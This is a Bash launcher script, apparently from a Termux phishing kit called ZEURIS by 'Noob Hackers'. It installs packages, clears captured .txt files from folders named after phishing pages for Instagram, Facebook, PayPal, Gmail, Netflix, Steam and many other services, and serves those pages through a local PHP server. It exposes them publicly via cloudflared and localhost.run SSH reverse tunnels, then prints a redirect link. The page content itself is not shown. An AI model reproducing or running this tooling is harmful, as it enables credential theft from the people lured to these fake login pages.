#Tool By Noob Hackers
clear
echo ""
echo ""
echo ""
echo ""
echo -e "\e[33m                  Wait For 5 Mins...!"
echo -e "\e[33m              Internet should be speed...!"
pkg install ncurses-utils -y > /dev/null 2>&1
pkg install chafa -y > /dev/null 2>&1
ssh -o StrictHostKeyChecking=no -R 80:localhost:8013 nokey@localhost.run > /dev/null 2>&1
clear
# Get terminal width
TERMINAL_WIDTH=$(tput cols)

# Calculate maximum progress bar length (50 is the default)
MAX_LENGTH=$((TERMINAL_WIDTH - 10))  # 10 is reserved for the percentage and brackets

# Path to the flag file
FLAG_FILE="$HOME/.script_installed"

# Function to display the loader
show_loader() {
  # Hide cursor
  echo -ne "\033[?25l"
  (
 for i in $(seq 1 $MAX_LENGTH); do
      # Calculate percentage
      percent=$((i * 100 / MAX_LENGTH))

      # Dynamically build the progress bar
      echo -ne "\r\033[1;32m["
      for j in $(seq 1 $i); do
        echo -ne "▇"
      done
for j in $(seq $((i + 1)) $MAX_LENGTH); do
        echo -ne " "
      done
      echo -ne "] $percent%\033[0m"
      sleep 0.05
    done
  ) &
  LOADER_PID=$!
}

# Function to check and install all required packages only once
check_and_install_once() {
  echo -e "\033[1;32mChecking and installing required packages...\033[0m"
  show_loader

  # Array of packages to check
  PACKAGES=("php" "cloudflared" "xdg-utils" "git" "curl" "openssh" "chafa")

  # Map package names to install commands
  INSTALL_CMDS=(
    "pkg install php -y"
    "pkg install cloudflared -y"
    "pkg install git -y"
    "pkg install curl -y"
    "pkg install openssh -y"
  )

  # Iterate through packages
  for i in "${!PACKAGES[@]}"; do
    PACKAGE="${PACKAGES[$i]}"
    INSTALL_CMD="${INSTALL_CMDS[$i]}"

    if ! command -v $PACKAGE >/dev/null 2>&1; then
      echo -e "\033[1;34mInstalling $PACKAGE...\033[0m" > /dev/null 2>&1
      eval "$INSTALL_CMD" > /dev/null 2>&1
    fi
  done

  # Wait for the loader to finish
  wait $LOADER_PID

  # Show cursor
  echo -ne "\033[?25h"
  printf "\n"

  echo -e "\033[1;33mAll packages are checked and installed ✅\033[0m"
  printf "\n"
  sleep 5
  # Create the flag file to indicate that the script has run
  touch "$FLAG_FILE"
}

# Main script execution
if [ -f "$FLAG_FILE" ]; then
  echo ""
else
  check_and_install_once
fi
###################
rm localhostrun.txt  > /dev/null 2>&1 &
rm localrun.txt  > /dev/null 2>&1 &
rm cloudflare.txt > /dev/null 2>&1 &
rm clflare.txt > /dev/null 2>&1 &

#!/bin/bash
folders=( "zeuris" "webs" "webs/instagram" "webs/facebook" "webs/airtelsim" 
"webs/ajio" "webs/amazon" "webs/apple" "webs/clashofclans"
"webs/fbpoll" "webs/fbsec" "webs/freefire" "webs/github"
"webs/igverify" "webs/googlepoll" "webs/googlenew" "webs/gmail"
"webs/instafollowers" "webs/jiorouter" "webs/linkedin" "webs/netflix" 
"webs/playstation" "webs/paypal" "webs/outlook" "webs/ola"
"webs/steam" "zeuris/webs/socialclub" "webs/snapchat" "webs/shopify" "webs/pubg" 
"webs/telegram" "webs/twitter" "webs/wifi" "webs/wordpress"
"webs/youtube" "webs/yahoo" "webs/xbox")

for folder in "${folders[@]}"; do
  find "$folder" -type f -name "*.txt" -exec rm -f {} \; > /dev/null 2>&1 &
done

wait

center_image() {
    clear
    img_width=30
    img_height=20
    # Get terminal dimensions
    term_rows=$(tput lines)
    term_cols=$(tput cols)

    # Calculate vertical padding
    vertical_padding=$(( (term_rows - img_height) / 2 ))
    if [ $vertical_padding -lt 0 ]; then vertical_padding=0; fi

    # Calculate horizontal padding
    horizontal_padding=$(( (term_cols - img_width) / 2 ))
    if [ $horizontal_padding -lt 0 ]; then horizontal_padding=0; fi

    # Print blank lines for vertical padding
    for ((i = 0; i < vertical_padding; i++)); do
        echo
    done

    # Use chafa to display the image with fixed size and horizontal padding
    chafa --size ${img_width}x${img_height} zeuris.png | sed "s/^/$(printf ' %.0s' $(seq 1 $horizontal_padding))/"

}
center_image


####Center Name
namv=$(echo -e "\e[33mZEURIS")
nam=$(echo -e "\e[92m :::: BY NOOB HACKERS ::::")
name=$(echo -e "\e[37m :::: github.com/noob-hackers ::::")
term_width=$(tput cols)
title1="$namv"
title2="$nam"
title3="$name"

title1_width=${#title1}
title2_width=${#title2}
title3_width=${#title3}

# Calculate horizontal padding
padding1=$(( (term_width - title1_width) / 2 ))
padding2=$(( (term_width - title2_width) / 2 ))
padding3=$(( (term_width - title3_width) / 2 ))

# Print centered titles
echo
printf "%*s\n" $(( padding1 + title1_width )) "$title1"
printf "%*s\n" $(( padding2 + title2_width )) "$title2"
printf "%*s\n" $(( padding3 + title3_width )) "$title3"
echo
#####

menu() {
    # Get terminal dimensions
    term_rows=$(tput lines)
    term_cols=$(tput cols)

    # Menu content
    menu_content=(
        '[1]---\e[37mSTART'
        '[2]---\e[37mUPDATE'
        '[3]---\e[37mABOUT'
        '[4]---\e[37mMORE'
        '[5]---\e[37mFOLLOW'
        '[6]---\e[37mCHAT NOW'
		'[7]---\e[37mTUTORIAL'
        '[8]---\e[37mEXIT'
    )

    # Calculate vertical padding (centering vertically)
    vertical_padding=$(( (term_rows - ${#menu_content[@]} - 2) / 2 ))

    # Estimate the width of the menu
    menu_width=0
    for item in "${menu_content[@]}"; do
        if [ ${#item} -gt $menu_width ]; then
            menu_width=${#item}
        fi
    done

    # Get the terminal's character width (assuming single-character width)
    char_width=1

    # Calculate horizontal padding (centering horizontally)
    horizontal_padding=$(( (term_cols - menu_width) / 2 ))

    # Print vertical padding
    for ((i = 0; i < vertical_padding; i++)); do
        echo -n ""  # No extra line break here, it ensures there's no space before the menu
    done

    # Print each menu item with horizontal padding
    for item in "${menu_content[@]}"; do
        echo -e "$(printf ' %.0s' $(seq 1 $horizontal_padding))\e[92m$item\e[0m"
    done

    # Prompt for user input
    echo -ne "$(printf ' %.0s' $(seq 1 $horizontal_padding))\e[92mSelect Option\e[0m:» \e[92m"
    read iput

    # Handle user input
    if [[ "$iput" = "1" || "$iput" = "one" ]]; then
    start 2>/dev/null
    echo -e "\e[33m                 Starting Wait...!"
    elif [[ "$iput" = "2" || "$iput" = "two" ]]; then
    xdg-open https://github.com/noob-hackers/zeuris 2>/dev/null
    bash zeuris.sh
    elif [[ "$iput" = "3" || "$iput" = "three" ]]; then
    xdg-open http://bit.ly/nbhfollowus 2>/dev/null
    bash zeuris.sh
    elif [[ "$iput" = "4" || "$iput" = "four" ]]; then
    xdg-open https://github.com/noob-hackers?tab=repositories 2>/dev/null
    bash zeuris.sh
    elif [[ "$iput" = "5" || "$iput" = "five" ]]; then
    xdg-open http://bit.ly/nbhfollowus 2>/dev/null
    bash zeuris.sh
    elif [[ "$iput" = "6" || "$iput" = "six" ]]; then
    xdg-open https://bit.ly/nbhwatsapgroups 2>/dev/null
    bash zeuris.sh
    elif [[ "$iput" = "7" || "$iput" = "seven" ]]; then
    xdg-open https://bit.ly/ourdltdvideos 2>/dev/null
    bash zeuris.sh
    elif [[ "$iput" = "8" || "$iput" = "eight" ]]; then
        exit 1
    elif [[ "$iput" = "9" || "$iput" = "nine" ]]; then
        exit 1
    else
        echo " "
        echo -e "$(printf ' %.0s' $(seq 1 $horizontal_padding))\e[93m Wrong Input\e[0m"
        exit 1
    fi
}
menu



#!/bin/bash

# Function to clean up and stop services
cleanup() {
    echo -e "\n\e[33m                    Stopping services...\e[0m"
    pkill ssh > /dev/null 2>&1
    pkill cloudflared > /dev/null 2>&1
    pkill php > /dev/null 2>&1
    echo -e "\e[33m                    Services stopped. Exiting.\e[0m"
    exit 0
}

# Trap Ctrl+C (SIGINT) to run the cleanup function
trap cleanup SIGINT

start() {
    pkill ssh > /dev/null 2>&1 &
    pkill cloudflared > /dev/null 2>&1 &
    pkill php > /dev/null 2>&1 &
    sleep 3
    # Start PHP server
    cd ~/zeuris/webs && php -S localhost:8424 > /dev/null 2>&1 &
    # Start Cloudflare tunnel
    cloudflared tunnel --url http://localhost:8013 > ~/zeuris/cloudflare.txt 2>&1 &
    sleep 10
    server1=$(grep -o "https://[a-zA-Z0-9.-]*\.trycloudflare\.com" ~/zeuris/cloudflare.txt | tail -n 1)
    # Start SSH tunnel
    ssh -R 80:localhost:8013 nokey@localhost.run > ~/zeuris/localhostrun.txt 2>&1 &
    sleep 10
    server2=$(grep -o "https://[a-zA-Z0-9.-]*\.lhr\.life" ~/zeuris/localhostrun.txt | tail -n 1)
    echo "$server1" > clflare.txt 2>&1 &
    echo "$server2" > localrun.txt 2>&1 &
    mv localrun.txt webs
    mv clflare.txt webs 
    clear
    center_image
    echo
    printf "%*s\n" $(( padding1 + title1_width )) "$title1"
    printf "%*s\n" $(( padding2 + title2_width )) "$title2"
    printf "%*s\n" $(( padding3 + title3_width )) "$title3"
    echo
    echo -e "\e[33m                     ██████████████████████"
    echo -e "\e[33m                     █                    █"
    echo -e "\e[33m                     █  Servers Started   █"
    echo -e "\e[33m                     █   Redirecting...!  █"
    echo -e "\e[33m                     █                    █"
    echo -e "\e[33m                     ██████████████████████"
    echo " "
	echo -e "\e[33m                       Wait For 5 Seconds"
	echo " "
	sleep 5
	    xdg-open https://fintechwins.blogspot.com/p/retro.html 2>/dev/null
    echo " "
	echo -e "\e[33m                  Copy Paste This Link In Browser"
    echo -e "\e[33m                 --------------------------------"
    echo -e "\e[33m             Link: \e[92mhttps://fintechwins.blogspot.com/p/retro.html"
    echo " "
    echo -e "\e[32m           Press Ctrl+C to stop the script and all services.\e[0m"

    # Keep the script running until Ctrl+C is pressed
    while :; do
        sleep 1
    done
}
start
